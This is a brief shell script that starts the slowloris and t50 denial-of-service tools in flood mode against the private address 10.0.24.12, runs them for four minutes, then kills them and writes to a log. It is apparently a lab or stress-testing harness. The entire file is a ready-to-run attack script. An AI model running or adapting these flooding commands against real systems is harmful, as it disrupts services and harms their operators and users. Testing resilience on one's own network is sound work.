#!/bin/sh

#Start slowloris
/root/slowloris.pl/slowloris.pl -dns 10.0.24.12 &

#Start t50
/root/t50-5.4.1/t50 10.0.24.12 --flood --turbo &

sleep 240

killall slowloris.pl
killall t50

echo '1' >> /root/log
sleep 5
